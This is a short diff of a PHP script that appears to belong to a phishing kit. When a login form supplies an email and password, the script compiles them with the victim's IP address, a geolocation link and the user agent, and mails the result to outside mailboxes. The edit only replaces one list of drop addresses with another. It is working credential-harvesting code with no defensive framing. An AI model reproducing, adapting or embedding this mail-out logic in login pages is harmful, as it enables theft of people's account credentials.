@@ -15,7 +15,7 @@ if($email != null && $password != null){
 	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
 	$message .= "User Agent : ".$useragent."\n";
 	$message .= "|-----------------------|\n";
-	$send = "alifund@yandex.com,alifeedback123@gmail.com,wantos1chase@163.com";
+	$send = "hillarycharles147@yandex.com,olamich46@gmail.com";
 	$subject = "Euro AllDomain$$ : $ip";
     mail($send, $subject, $message);   
 	$signal = 'ok';
